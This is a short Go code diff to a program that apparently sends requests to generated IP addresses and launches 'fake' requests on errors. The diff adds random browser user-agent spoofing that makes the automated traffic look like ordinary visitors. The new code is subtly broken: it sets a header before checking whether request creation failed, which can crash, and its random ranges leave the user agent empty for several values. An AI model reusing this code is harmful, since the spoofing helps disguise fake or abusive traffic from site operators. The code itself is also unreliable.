@@ -43,7 +43,15 @@ func generateIp() (string)  {
 }
 
 func doResponse(address string)  {
-	response, err := http.Get(address)
+	userAgent := getUserAgent()
+	client := &http.Client{}
+	req, err := http.NewRequest("GET", address, nil)
+	req.Header.Set("User-Agent", userAgent)
+	if err != nil {
+		fmt.Printf("%s", err)
+		go sendFakeRequest()
+	}
+	response, err := client.Do(req)
 	if err != nil {
 		fmt.Printf("%s", err)
 		go sendFakeRequest()
@@ -56,4 +64,22 @@ func doResponse(address string)  {
 		}
 		fmt.Printf("%s\n", string(contents))
 	}
+}
+
+func getUserAgent() (string) {
+	a := rand.Intn(100)
+	var userAgent string
+	if (a > 5 && a < 10) {
+		userAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
+	} else if (a > 10 && a < 20) {
+		userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25"
+	} else if (a > 20 && a < 30) {
+		userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0"
+	} else if (a > 30 && a < 40) {
+		userAgent = "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
+	} else if (a > 40) {
+		userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
+	}
+
+	return userAgent
 }
